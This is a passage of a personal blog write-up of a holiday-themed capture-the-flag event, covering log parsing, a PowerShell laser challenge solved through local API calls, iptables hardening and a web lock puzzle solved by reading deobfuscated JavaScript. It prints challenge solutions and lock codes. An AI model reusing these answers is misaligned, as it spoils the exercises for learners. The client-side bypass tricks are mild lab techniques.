             &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You'll need to hit CTRL+C when it doesn't find any more solutions. It's not the fastest, has unused bits and I don't know why it has the for digit in range(1) bit.&lt;/p&gt;
&lt;h2 id="on-to-the-next-challenge"&gt;On to the next challenge!:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The windows events log file I just opened the file on a Windows machine and looked around&lt;/li&gt;
&lt;li&gt;The sysmon file I printed some interesting keys in the json strings with a tiny python script&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;

&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sysmon-data.json&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;json_file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;json_file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;command_line&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;process_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;For the splunk basically just followed the chats. A bit tricky to be fair! By luck I had managed to already download the correct file from the Archive but did not look at it deep enough..&lt;/li&gt;
&lt;li&gt;For the greylog just clicked around. I liked the "quick table" feature and that got me some of the questions fairly quickly without having to write more narrow searches. Quite a few steps needed for this so took some time. It was nice to get to compare greylog and splunk, I've only used a vanilla ELK stack before and last version 5. With that in mind the discover data was for me a bit easier on greylog.&lt;/li&gt;
&lt;li&gt;Trail of tears I just beat the game on easy :) (&lt;em&gt;/edit turns&lt;/em&gt; one can solve this on hard&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="next-one-was-a-powershell-one-the-laser-adjuster-p"&gt;Next one was a powershell one! The laser adjuster :P&lt;/h2&gt;
&lt;p&gt;Finally got to get a bit familiar with powershell. I'm a lurker on &lt;a href="https://www.reddit.com/r/sysadmin/"&gt;r/sysadmin&lt;/a&gt; and very often there are powershell oneliners on display there. This was quite a fun one to be honest :) Kind of like using python directly in the shell.&lt;/p&gt;
&lt;p&gt;Some things I learnt were:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Get-History shows stuff! But no .bash_history so I actually wonder where this history is from? It's not in .local/powershell...&lt;/li&gt;
&lt;li&gt;Trying to bruteforce this one manually was very slow so I gave that up fairly quickly.&lt;/li&gt;
&lt;li&gt;I tried to find a way into reading the python code that powered the website. Only found the process id but no open files visible. Would need to get root for that I suppose..&lt;/li&gt;
&lt;li&gt;figured out how to -X POST a body for the gases!&lt;/li&gt;
&lt;li&gt;hints in chat suggested powering off and on&lt;/li&gt;
&lt;li&gt;$env has things!&lt;/li&gt;
&lt;li&gt;Format-Hex -Path ./archive | Select-Object -First 1&lt;ul&gt;
&lt;li&gt;magic number 50 4B 03 == zip&lt;/li&gt;
&lt;li&gt;expand-archive&lt;/li&gt;
&lt;li&gt;chmod +x&lt;/li&gt;
&lt;li&gt;get-content riddle # Gives an md5sum&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;md5sum hunter&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$files&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Get-childitem&lt;/span&gt; &lt;span class="n"&gt;-Path&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;depths&lt;/span&gt; &lt;span class="n"&gt;-recurse&lt;/span&gt; &lt;span class="o"&gt;-File&lt;/span&gt;
&lt;span class="k"&gt;Foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$file&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;$files&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;Get-FileHash&lt;/span&gt; &lt;span class="n"&gt;-Path&lt;/span&gt; &lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fullname&lt;/span&gt; &lt;span class="n"&gt;-Algorithm&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;hash&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Select-String&lt;/span&gt; &lt;span class="n"&gt;25520151A320B5B0D21561F92C8F6224&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
       &lt;span class="nv"&gt;$file&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Could have found this with a recurse grep for temperature -e angle -e param..&lt;/p&gt;
&lt;p&gt;The solution:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;-Uri&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;1225&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;api&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;off&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RawContent&lt;/span&gt;&lt;span class="w"&gt;                                       &lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;correct_gases_postbody&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;O=&amp;#39;6&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;H=&amp;#39;7&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;He=&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;N=&amp;#39;4&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;Ne=&amp;#39;22&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;Ar=&amp;#39;11&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;Xe=&amp;#39;10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;F=&amp;#39;20&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;Kr=&amp;#39;8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;Rn=&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;-Uri&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;1225&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;api&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;gas&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;-Method&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;POST&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;-Body&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;correct_gases_postbody&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RawContent&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;127&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;1225&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;api&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;angle&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nt"&gt;val&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;65&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RawContent&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;127&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;1225&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;api&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;temperature&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nt"&gt;val&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;-33&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RawContent&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;127&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;1225&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;api&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;refraction&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nt"&gt;val&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;867&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RawContent&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;-Uri&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;1225&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;api&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;on&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RawContent&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;-Uri&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;1225&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;api&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;output&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RawContent&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="iptables"&gt;iptables&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Iptables/ smart bracelet one: think I was close or did complete this but Kent did not agree? Went back and tried this again slowly by first writing the commands in a text file&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#1
sudo iptables -P FORWARD DROP

sudo iptables -P INPUT DROP

sudo iptables -P OUTPUT DROP

#2
# shouldbe in two lines? as the iptables output orders them related,established..
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

#3
sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT

#4
sudo iptables -A INPUT -p tcp --dport 21 -s 0.0.0.0/0 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -s 0.0.0.0/0 -j ACCEPT

#5
sudo iptables -A OUTPUT -p tcp --dport 80 -d 0.0.0.0/0 -j ACCEPT

#6
sudo iptables -A INPUT -i lo -j ACCEPT

Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Sled Route API : Got the login. Next to figure out which requests were bad and how to fill in 100 on the web page... Maybe one can figure out the firewall API? Hmm played a bit with elasticsearch.. then gave up.. in the meantime went ahead to:&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="sleigh-shop-door"&gt;Sleigh Shop Door&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Ah this isfun! While poking through the web source after fixing the smartbracelet found the URL to the sleigh shop in teh source. It had a bunch of locks.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;haha&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;reload&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;codes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;needed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;different&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;

&lt;span class="mf"&gt;1.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;B46DU583&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;top&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;
&lt;span class="mf"&gt;2.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;XNUBLBKW&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;see&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;by&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lookingin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;
&lt;span class="mf"&gt;3.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;unknown&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fetched&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;but&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;never&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shown&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;

&lt;span class="n"&gt;ha&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;was&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;funneh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;clicking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;around&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tabs&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;javascript&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;needed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;some&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;deobfuscate&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jsnice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;_0x1e21&lt;/span&gt;

&lt;span class="n"&gt;so&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ran&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;statements&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eventually&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_0x1e21&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;jIdunh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;

&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;printed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bunch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;things&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;element&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;had&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;an&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_0x1e21&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;jIdunh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;span class="n"&gt;VM3008&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;images&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;png&lt;/span&gt;

